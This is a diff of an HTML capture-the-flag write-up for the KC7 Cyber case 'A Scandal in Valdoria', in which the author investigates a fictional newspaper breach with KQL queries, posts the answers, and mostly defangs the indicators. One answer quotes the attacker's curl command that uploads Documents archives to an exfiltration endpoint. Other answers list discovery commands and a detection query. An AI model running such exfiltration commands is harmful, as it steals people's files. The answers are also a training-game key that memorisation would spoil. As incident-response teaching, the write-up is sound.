@@ -20,10 +20,9 @@
       <a href="../../writeups.html">Writeups</a>
     </nav>
     <!--page navigation-->
-    <a class="skip" href="#page-main">Skip to main content</a>
     <nav class="page-nav" id="page-navigation">
-      <h2>Page Navigation</h2>
       <ol class="page-toc">
+        <a class="skip" href="#page-main">Skip to main content</a>
         <li><a href="#intro">Introduction</a>
         <li><a href=#sections>Sections</a>
           <ol class="section-toc">
@@ -129,15 +128,18 @@
             </li>
           </ol>
         </li>
-        <!--<li><a href="#timeline">Timeline of Events</a></li>
-        <li><a href="#impressions">Impressions</a></li>-->
       </ol> <!--page-toc class-->
     </nav> <!--page navigation-->
     <main id="page-main">
       <!--introduction-->
       <article id="intro">
         <h1>A Scandal in Valdoria</h1>
-        <p>The first in a series focusing on the fictional city of Valdoria. This case has <a href="https://kc7cyber.com/guide/132">a training guide</a> containing lore and basic KQL tips. This case focuses on an attack against the Valdorian Times that led to the publication of an unapproved, slanderous article against a political candidate written and planted by hostile third parties.</p>
+        <p>The first in a series focusing on the fictional city of Valdoria, and the second of KC7's easiest cases. This time around, we take on the role of an incident responder, focusing on an attack against the Valdorian Times that led to the publication of an unapproved, slanderous article against a political candidate written and planted by hostile third parties. This case has <a href="https://kc7cyber.com/guide/132">a training guide</a> containing lore and basic KQL tips.</p>
+        <p><strong>⚠️ The remainder of this introduction contains spoilers on the case. You may skip this section with the navigation. ⚠️</strong></p>
+        <p>As is often the case, a fairly simple phishing email with just-enough information to be convincing and to elicit curiosity is more than enough to cause trouble.</p>
+        <p>The easiest thing is to tut-tut at the Editorial Intern for their carelessness (it's 2025, stop opening arbitrary files from strangers!), but Valdoria Times as an organization could've had additional security measures in place to avoid something like this happening. For instance, despite there being a <code>SecurityAlerts</code> table (ostensibly populated by security software such as a SIEM tool), the malicious file was <em>not</em> flagged in any device except 2 (belonging to two Directors of News Operations), despite being present in 8 other devices belonging to 8 distinct employees. There's also the fact that the malicious email even got pass whatever email filtering is in place; it's admittedly a tricky thing to balance convenience (or just plain "allow people to do their jobs effectively") with security, but more fine-tuned rules could've been considered.</p>
+        <p>One also wonders what cybersecurity training has been given to the employees, if any.</p>
+        <p>And finally, setting more effective policies on employee devices to prevent the execution of any arbitrary, unauthorized binaries (such as <code>plink.exe</code> and <code>curl.exe</code>). Windows has a few mechanisms built in, actually: <a href="https://learn.microsoft.com/en-us/windows-server/identity/software-restriction-policies/software-restriction-policies">Software Restriction Policies</a> (deprecated since Windows 10), <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview">AppLocker</a> and <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol">Windows Defender Application Control</a>.</p>
       </article>
       <!--the game sections-->
       <article id=sections>
@@ -147,7 +149,7 @@
           <h3>Section 1 - KQL 101</h3>
           <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
           <section class="question-card" id="question1">
-            <h4>Q1 - Enter ready to get started!</h4>
+            <h4>Q1 - Enter <i>ready</i> to get started!</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code></code></pre>
@@ -158,12 +160,12 @@
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>This question gives player some backstory before starting a tutorial section.</p>
+              <p>This question gives player some backstory before starting a tutorial section. It even comes with <a href="https://www.youtube.com/watch?v=3Vq7k8-7qMg">a neat video</a>.</p>
             </div>
           </section>
 
           <section class="question-card" id="question2">
-            <h4>Q2 - Type "done" to earn credit for this question.</h4>
+            <h4>Q2 - Type <i>done</i> to earn credit for this question.</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>Employees
@@ -218,7 +220,7 @@
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>Email
-| where recipient == "nene_leaks@valdoriantimes.news"
+| where recipient == "nene_leaksATvaldoriantimes[.]news"
 | count</code></pre>
             </div>
             <div class="answer-card">
@@ -232,11 +234,11 @@
           </section>
 
           <section class="question-card" id="question6">
-            <h4>Q6 - How many distinct senders were seen in the email logs from the domain name "weprinturstuff.com"?</h4>
+            <h4>Q6 - How many distinct senders were seen in the email logs from the domain name "weprinturstuff[.]com"?</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>Email
-| where sender has "weprinturstuff.com"
+| where sender has "weprinturstuff[.]com"
 | distinct sender
 | count</code></pre>
             </div>
@@ -292,20 +294,20 @@ Employees
           </section>
 
           <section class="question-card" id="question9">
-            <h4>Q9 - What IPs did the domain “jobhire.org” resolve to (enter any one of them)?</h4>
+            <h4>Q9 - What IPs did the domain “jobhire[.]org” resolve to (enter any one of them)?</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>PassiveDns
-| where domain == "jobhire.org"
+| where domain == "jobhire[.]org"
 | distinct ip</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>191.7.248.112</p>
+              <p>191[.]7[.]248[.]112</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>It's the only IP</p>
+              <p>It's the only IP.</p>
             </div>
           </section>
 
@@ -354,7 +356,7 @@ AuthenticationEvents
           </section>
 
           <section class="question-card" id="question12">
-            <h4>Q12 - Enter "ready" to earn credit for this question.</h4>
+            <h4>Q12 - Enter <i>ready</i> to earn credit for this question.</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code></code></pre>
@@ -417,7 +419,7 @@ AuthenticationEvents
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>Checking for this information is important, as it might be an important clue (e.g. that the recently-hired employee might be malicious)</p>
+              <p>Checking for this information is important, as it might be a crucial clue (e.g. that the recently-hired employee might be malicious)</p>
             </div>
           </section>
 
@@ -470,7 +472,7 @@ AuthenticationEvents
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>ronnie_mclovin@valdoriantimes.news</p>
+              <p>ronnie_mclovinATvaldoriantimes[.]news</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -539,7 +541,7 @@ AuthenticationEvents
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>newspaper_jobs@gmail.com</p>
+              <p>newspaper_jobsATgmail[.]com</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -555,7 +557,7 @@ AuthenticationEvents
 | where name == "Sonia Gose"
 | distinct email_addr
 | lookup Email on $left.email_addr == $right.recipient
-| where sender == "newspaper_jobs@gmail.com" or reply_to == "newspaper_jobs@gmail.com"
+| where sender == "newspaper_jobsATgmail[.]com" or reply_to == "newspaper_jobsATgmail[.]com"
 //The reply_to is to unmask any potentially related alternate email addresses.
 //It didn't turn out anything in this case.</code></pre>
             </div>
@@ -577,7 +579,7 @@ AuthenticationEvents
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx</p>
+              <p>hxxps[://]promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter[.]docx</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -595,7 +597,7 @@ AuthenticationEvents
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>10.10.0.3</p>
+              <p>10[.]10[.]0[.]3</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -611,7 +613,7 @@ AuthenticationEvents
 | where name == "Sonia Gose"
 | distinct ip_addr
 | lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
-| where url == "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"</code></pre>
+| where url == "hxxps[://]promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter[.]docx"</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -791,7 +793,7 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>There is a comment that specifies using green as the foreground color because "is a hacker color"</p>
+              <p>There is a comment that specifies using green as the foreground color because "is a hacker color" [sic].</p>
             </div>
           </section>
 
@@ -881,7 +883,7 @@ Employees
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>136.130.190.181</p>
+              <p>136[.]130[.]190[.]181</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -956,11 +958,11 @@ Employees
               <h5>Comments</h5>
               <p>The commands were:</p>
               <ol>
-                <li><code>whoami</code>: <quote>Displays user, group and privileges information for the user who is currently logged on to the local system. If used without parameters, whoami displays the current domain and user name.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">official Windows Commands documentation</a>.</li>
-                <li><code>ipconfig</code>: <quote>Displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Used without parameters, ipconfig displays Internet Protocol version 4 (IPv4) and IPv6 addresses, subnet mask, and default gateway for all adapters.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig">official Windows Commands documentation</a>.</li>
-                <li><code>arp -a</code>: <quote>Displays and modifies entries in the Address Resolution Protocol (ARP) cache. The ARP cache contains one or more tables that are used to store IP addresses and their resolved Ethernet or Token Ring physical addresses. [...] To display the arp cache tables for all interfaces, use arp /a</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp">official Windows Commands documentation</a>.</li>
-                <li><code>tasklist /svc</code>: <quote>Displays a list of currently running processes on the local computer or on a remote computer. svc : Lists all the service information for each process without truncation.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist">official Windows Commands documentation</a>.</li>
-                <li><code>net view</code>: <quote>Displays a list of domains, computers, or resources that are being shared by the specified computer. Used without parameters, net view displays a list of computers in your current domain.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576(v=ws.11)">official Windows Commands documentation</a>.</li>
+                <li><code>whoami</code>: <quote>Displays user, group and privileges information for the user who is currently logged on to the local system. If used without parameters, whoami displays the current domain and user name.</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">Microsoft Learn</a>].</li>
+                <li><code>ipconfig</code>: <quote>Displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Used without parameters, ipconfig displays Internet Protocol version 4 (IPv4) and IPv6 addresses, subnet mask, and default gateway for all adapters.</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig">Microsoft Learn</a>].</li>
+                <li><code>arp -a</code>: <quote>Displays and modifies entries in the Address Resolution Protocol (ARP) cache. The ARP cache contains one or more tables that are used to store IP addresses and their resolved Ethernet or Token Ring physical addresses. [...] To display the arp cache tables for all interfaces, use arp /a</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp">Microsoft Learn</a>].</li>
+                <li><code>tasklist /svc</code>: <quote>Displays a list of currently running processes on the local computer or on a remote computer. svc : Lists all the service information for each process without truncation.</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist">Microsoft Learn</a>].</li>
+                <li><code>net view</code>: <quote>Displays a list of domains, computers, or resources that are being shared by the specified computer. Used without parameters, net view displays a list of computers in your current domain.</quote> [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576(v=ws.11)">Microsoft Learn</a>].</li>
               </ol>
             </div>
           </section>
@@ -990,7 +992,7 @@ Employees
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>Email
-| where sender == "valdorias_best_recruiter@gmail.com"</code></pre>
+| where sender == "valdorias_best_recruiterATgmail[.]com"</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -998,16 +1000,16 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>The question tells you of another suspicious email address: <code>valdorias_best_recruiter@gmail.com</code></p><p>Which did not appear in our previous queries. It should be noted that appending <code>or reply_to == "valdorias_best_recruiter@gmail.com"</code> to the above query shows that some emails were sent from the previous suspicious email address (<code>newspaper_jobs@gmail.com</code>) but with the <code>reply_to</code> field set to the new email address. If the game had never explicitly told us to check <code>valdorias_best_recruiter@gmail.com</code>, then a query such as...</p>
+              <p>The question tells you of another suspicious email address: <code>valdorias_best_recruiterATgmail.com</code></p><p>Which did not appear in our previous queries. It should be noted that appending <code>or reply_to == "valdorias_best_recruiterATgmail[.]com"</code> to the above query shows that some emails were sent from the previous suspicious email address (<code>newspaper_jobsATgmail[.]com</code>) but with the <code>reply_to</code> field set to the new email address. If the game had never explicitly told us to check <code>valdorias_best_recruiterATgmail[.]com</code>, then a query such as...</p>
 <pre><code>Email
-| where sender == "newspaper_jobs@gmail.com" or reply_to == "newspaper_jobs@gmail.com"</code></pre>
-    <p>...would have shown emails sent from <code>valdorias_best_recruiter@gmail.com</code> but with the other email address as the reply to. This would have allowed us to uncover this other malicious email address. Then we can do a query for emails where <code>valdorias_best_recruiter@gmail.com</code> was the sender especifically.</p>
+| where sender == "newspaper_jobsATgmail[.]com" or reply_to == "newspaper_jobsATgmail[.]com"</code></pre>
+    <p>...would have shown emails sent from <code>valdorias_best_recruiterATgmail[.]com</code> but with the other email address as the reply to. This would have allowed us to uncover this other malicious email address. Then we can do a query for emails where <code>valdorias_best_recruiterATgmail[.]com</code> was the sender especifically.</p>
     <p>Just something to keep in mind for future cases.</p>
             </div>
           </section>
 
           <section class="question-card" id="question48">
-            <h4>Q2 - When did valdorias_best_recruiter@gmail.com send an email to Ronnie McLovin?</h4>
+            <h4>Q2 - When did valdorias_best_recruiterATgmail[.]com send an email to Ronnie McLovin?</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code></code></pre>
@@ -1030,7 +1032,7 @@ Employees
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>promotionrecruit.org</p>
+              <p>promotionrecruit[.]org</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -1055,14 +1057,14 @@ Employees
           </section>
 
           <section class="question-card" id="question51">
-            <h4>Q5 - When did Ronnie click on the link in the email from <code>valdorias_best_recruiter@gmail.com</code>?</h4>
+            <h4>Q5 - When did Ronnie click on the link in the email from <code>valdorias_best_recruiterATgmail[.]com</code>?</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>Employees
 | where name == "Ronnie McLovin"
 | distinct ip_addr
 | lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
-| where url contains "promotionrecruit.org"</code></pre>
+| where url contains "promotionrecruit[.]org"</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -1098,8 +1100,7 @@ Employees
 | where name == "Ronnie McLovin"
 | distinct hostname
 | lookup FileCreationEvents on $left.hostname == $right.hostname
-| where timestamp >= datetime(2024-01-10T08:55:07Z)
-//if we look for the timestamp (using the time we know she clicked on the link) we can see any other file creation events (such as, say, payloads being dropped) immediately after the file got downloaded</code></pre>
+| where timestamp >= datetime(2024-01-10T08:55:07Z)</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -1107,7 +1108,7 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p></p>
+              <p>If we look for the timestamp (using the time we know she clicked on the link) we can see any other file creation events (such as, say, payloads being dropped) immediately after the file got downloaded.</p>
             </div>
           </section>
 
@@ -1175,7 +1176,7 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p></p>
+              <p>[sic]</p>
             </div>
           </section>
 
@@ -1187,8 +1188,7 @@ Employees
 | where name == "Ronnie McLovin"
 | distinct hostname
 | lookup ProcessEvents on $left.hostname == $right.hostname
-| where timestamp >= datetime(2024-01-10T08:55:07Z)
-//the discovery commands occur before the Plink tunnel is established... this seems to be a game error</code></pre>
+| where timestamp >= datetime(2024-01-10T08:55:07Z)</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -1197,6 +1197,7 @@ Employees
             <div class="comment-card">
               <h5>Comments</h5>
               <p>Same five as before: <code>whoami</code>, <code>ipconfig</code>, <code>arp -a</code>, <code>tasklist /svc</code>, <code>net view</code></p>
+              <p>And, unless I am missing something, the discovery commands occur before the Plink tunnel is established... Which seems like a game error.</p>
             </div>
           </section>
 
@@ -1213,7 +1214,7 @@ Employees
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>10.10.0.19</p>
+              <p>10[.]10[.]0[.]19</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -1229,7 +1230,7 @@ Employees
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>https://hire-recruit.org/files/fakescandal/2024/fakestory.docx</p>
+              <p>hxxps[://]hire-recruit[.]org/files/fakescandal/2024/fakestory[.]docx</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -1355,7 +1356,7 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>The query returns 45 minutes but the correct answer is 44. This is an error in the game.</p>
+              <p>The query returns 45 minutes but, according to the game, the correct answer is 44. This is an error in the game.</p>
             </div>
           </section>
 
@@ -1513,7 +1514,7 @@ Employees
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
-              <p>curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php</p>
+              <p>curl -F "file=@C:\Users\romclovin\Documents\*.7z" hxxps[://]hirejob[.]com/exfil_processor/upload[.]php</p>
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
@@ -1538,11 +1539,11 @@ Employees
           </section>
 
           <section class="question-card" id="question78">
-            <h4>Q32 - Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)</h4>
+            <h4>Q32 - Was data stolen from any other devices and uploaded to hirejob[.]com? (yes/no)</h4>
             <div class="kql-query">
               <h5>Query</h5>
               <pre><code>ProcessEvents
-| where process_commandline has_all ("curl -F", "hirejob.com")</code></pre>
+| where process_commandline has_all ("curl -F", "hirejob[.]com")</code></pre>
             </div>
             <div class="answer-card">
               <h5>Answer</h5>
@@ -1583,14 +1584,14 @@ Employees
             </div>
             <div class="comment-card">
               <h5>Comments</h5>
-              <p>The player receives a mysterious email from <code>newspaper_jobs@gmail.com</code>, taunting with "you may think you found us[,] but you've got so much to learn". Tune in for the next episode...</p>
+              <p>The player receives a mysterious email from <code>newspaper_jobsATgmail[.]com</code>, taunting with "you may think you found us[,] but you've got so much to learn". Tune in for the next episode...</p>
             </div>
           </section>
         </section><!--fourth section-->
       </article>
     </main>
-    <a class="skip" href="#page-navigation">Return to page navigation</a>
     <footer>
+      <a class="skip" href="#page-navigation">Return to page navigation</a>
       <p>Made with vanilla HTML + CSS by shoutvoid</p>
       <address>
         <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
@@ -1601,22 +1602,3 @@ Employees
     </footer>
   </body>
 </html>
-<!--
-<section class="question-card" id="questionN">
-  <h4>QN</h4>
-  <div class="kql-query">
-    <h5>Query</h5>
-    <pre><code>KQL Query
-KQL Query
-KQL Query</code></pre>
-  </div>
-  <div class="answer-card">
-    <h5>Answer</h5>
-    <p>This is an answer</p>
-  </div>
-  <div class="comment-card">
-    <h5>Comments</h5>
-    <p>This is a comment on the question</p>
-  </div>
-</section>
--->
